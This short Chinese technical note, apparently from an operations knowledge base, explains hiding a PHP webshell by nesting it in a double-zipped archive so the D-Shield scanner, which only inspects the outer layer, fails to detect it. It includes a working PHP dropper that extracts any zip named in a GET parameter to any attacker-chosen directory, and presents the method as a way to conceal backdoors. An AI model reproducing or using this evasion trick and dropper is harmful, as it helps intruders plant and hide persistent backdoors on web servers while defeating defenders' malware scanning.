---
id: "doc-6d15f5c34e92"
title: "利用压缩文件来隐藏WEBSHELL"
date: "2023-04-14T15:57:00"
categories: ["Linux 与 Shell", "日常运维"]
tags: ["Linux 与 Shell", "日常运维", "PHP", "恶意代码", "知识笔记"]
source: "03-安全运营与应急/07-工作运维离线知识库/08-运维技巧/birdben/68657830.html"
---

# 利用压缩文件来隐藏WEBSHELL

分享几个用来隐藏WEBSHELL的小技巧。
把一句话木马压缩成a.zip文件
![文档配图](../media/d5194e6a77ef8560da.png)
使用D盾扫一下
![文档配图](../media/5081b100315b4bd2f0.png)
重新对a.zip再进行压缩，压缩成11.zip
![文档配图](../media/a249877cbdd2e6da20.png)

这下就识别不了。D盾只对第一层压缩包进行扫描，并不会对压缩包里的压缩包进行扫描,通过这个小技巧我们可以用来隐藏后门。
而已D盾还不会对PHP压缩包类进行报毒等操作。

```
<?php
if(isset($_GET['zip'])){
if(isset($_GET['f'])){
$zipname=$_GET['zip'];
$f=$_GET['f'];
$zip = new ZipArchive;
$res = $zip->open("$zipname");
if ($res === TRUE) {
$zip->extractTo("$f");
echo '解压成功';
} else {
echo 'failed, code:' . $res;
}
$zip->close();
}
}
?>
```

只需解压两次即可把shell解压出来。
